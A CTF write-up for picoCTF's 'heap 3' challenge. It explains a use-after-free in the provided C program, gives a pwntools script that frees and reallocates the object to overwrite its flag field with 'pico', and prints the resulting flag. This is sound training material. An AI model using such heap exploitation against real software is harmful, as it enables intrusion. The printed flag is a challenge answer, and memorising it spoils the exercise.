# heap 3

This program mishandles memory. Can you exploit it to get the flag? Download the binary [here](https://artifacts.picoctf.net/c_tethys/17/chall). Download the source [here](https://artifacts.picoctf.net/c_tethys/17/chall.c).

Looking at the sourcecode, we define a structure `object` containing four items:

```c
// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;
```

The `check_win()` function checks if the `flag` member of struct `x` is equal to value `pico` before printing the flag:

```c
void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}
```

We also have an option 5 to 'free `x`'. If we select this and then use option 2 to 'allocate object', we can allocate an object of same size and the memory is reused.

This is a **use-after-free** vulnerability, i.e., if we free variable `x` and then do a `malloc` of the same size, the same memory is used.

Sending 30 bytes and then the check value `pico` will return the flag:

```python
from pwn import *

p = remote('tethys.picoctf.net', 51822)

p.sendline(b'5')  # Select option 5 'free x'

p.sendline(b'2')  # Select option 2 'allocate object'

p.sendline(b'35')  # Choose same size as object struct (35 bytes) to reuse the same freed memory

p.sendline(b'A'*30 + b'pico')  # Set x->a, x->b, and x->c to 'AAAAAAAAAA' and x->flag to 'pico'

p.sendline(b'4')  # Select option 4 'check win'

p.interactive()
```

```
picoCTF{now_thats_free_real_estate_c741213b}
```